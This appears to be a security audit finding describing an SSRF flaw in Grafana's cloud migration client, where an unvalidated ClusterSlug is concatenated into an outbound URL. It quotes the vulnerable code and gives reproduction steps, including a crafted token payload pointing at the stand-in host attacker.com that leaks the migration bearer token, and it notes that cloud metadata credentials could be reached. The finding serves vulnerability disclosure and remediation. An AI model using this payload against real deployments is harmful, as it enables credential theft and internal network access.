Phase: 7
Sequence: 021
Slug: cloud-migration-ssrf
Verdict: VALID
Rationale: The cloud migration GMS client constructs outbound HTTP URLs by string-concatenating an unvalidated ClusterSlug into a URL template, enabling SSRF via URL-special characters. The SSRF occurs during token validation (ValidateToken), leaking the migration auth token to the attacker's server. Despite requiring GrafanaAdmin role and the feature being disabled by default, the SSRF provides a meaningful network-position escalation in cloud environments.
Severity-Original: MEDIUM
PoC-Status: theoretical
Pre-FP-Flag: check-4-ambiguous (requires GrafanaAdmin role -- higher than normal attacker position, but not infrastructure admin in managed deployments)
Debate: security/chamber-workspace/chamber-2/debate.md

## Summary

The Grafana cloud migration GMS client constructs outbound HTTP request URLs by directly string-concatenating an unvalidated `ClusterSlug` field into a URL template at `gms_client.go:309-323`. The ClusterSlug originates from a user-provided base64-encoded token during migration session creation. URL-special characters (`/`, `#`, `?`, `@`) in the ClusterSlug can redirect the HTTP request to an attacker-controlled host, enabling Server-Side Request Forgery (SSRF). The migration auth token (StackID + AuthToken) is leaked to the SSRF target via the Authorization header.

## Location

- **Primary**: `pkg/services/cloudmigration/gmsclient/gms_client.go:309-323` -- `buildURL()` function
- **SSRF sink**: `pkg/services/cloudmigration/gmsclient/gms_client.go:63` -- `c.httpClient.Do(req)`
- **Entry point**: `POST /api/cloudmigration/migration` -> `CreateSession` (api.go:59, 247-275)
- **Auth model**: `pkg/services/cloudmigration/model.go:266-275` -- `ToMigration()` extracts ClusterSlug without validation

## Attacker Control

- **Input**: `ClusterSlug` field in the base64-encoded token payload (JSON: `{"Token":"...", "Instance":{"ClusterSlug":"ATTACKER_VALUE", ...}}`)
- **Authentication required**: GrafanaAdmin role (accesscontrol.go:27) + cloud migration feature enabled (cloudmigration.go:121, disabled by default)
- **Injection technique**: ClusterSlug containing `/` terminates the hostname in the URL template. Example: `ClusterSlug = "x.attacker.com/evil?q="` produces `https://cms-x.attacker.com/evil?q=.grafana.net/cloud-migrations/api/v1/validate-key`. After `url.Parse()`, host resolves to `cms-x.attacker.com`.

## Trust Boundary Crossed

TB1 -- Internet Edge (outbound). The Grafana server makes HTTP requests from its network position to internal services or attacker-controlled hosts. In cloud environments, this enables access to instance metadata services (169.254.169.254) for IAM credential exfiltration.

## Impact

- **SSRF to internal network**: Grafana server makes HTTP requests to internal services not directly accessible to the attacker
- **Migration auth token leakage**: The `Authorization: Bearer <StackID>:<AuthToken>` header is sent to the SSRF target, leaking the migration credentials
- **Cloud metadata access**: In AWS/GCP/Azure environments, SSRF to 169.254.169.254 can yield IAM role credentials (AWS IMDSv1) or service account tokens
- **Constraints**: Requires GrafanaAdmin + feature enabled. Admin can already SSRF via datasource proxy, but this path leaks a different credential (migration token)

## Evidence

**Vulnerable code** (buildURL function):
```go
func (c *gmsClientImpl) buildURL(clusterSlug, path string) (string, error) {
    domain := c.cfg.CloudMigration.GMSDomain
    baseURL := fmt.Sprintf("https://cms-%s.%s/cloud-migrations", clusterSlug, domain)
    // Override path if domain has scheme prefix
    if strings.HasPrefix(domain, "http://") || strings.HasPrefix(domain, "https://") {
        baseURL = domain
    }
    parsed, err := url.Parse(baseURL + path)
    // ...
}
```

**No ClusterSlug validation**: `model.go:266-275` `ToMigration()` directly assigns ClusterSlug from decoded token payload with no format validation (no regex, no allowlist, no sanitization).

**SSRF during validation**: `cloudmigration.go:443` calls `ValidateToken()` which calls `ValidateKey()` which calls `buildURL()` with the unvalidated ClusterSlug. The SSRF occurs BEFORE the session is stored.

**Auth token leaked**: `gms_client.go:60-61`: `req.Header.Set("Authorization", fmt.Sprintf("Bearer %d:%s", cm.StackID, cm.AuthToken))` -- sent to the SSRF target.

## Reproduction Steps

1. Ensure cloud migration is enabled: set `cfg.CloudMigration.Enabled = true` in grafana.ini
2. Authenticate as GrafanaAdmin
3. Craft a base64 token payload:
   ```json
   {"Token":"any-token","Instance":{"StackID":1234,"Slug":"test","RegionSlug":"us","ClusterSlug":"x.attacker.com/evil?q="}}
   ```
4. Base64-encode the payload and send: `POST /api/cloudmigration/migration` with `{"authToken":"<base64-encoded>"}`
5. Observe: Grafana makes HTTP POST to `https://cms-x.attacker.com/evil?q=.<GMSDomain>/cloud-migrations/api/v1/validate-key` with `Authorization: Bearer 1234:any-token`
6. If attacker's server responds with 200, the session is stored. The migration auth token is leaked.
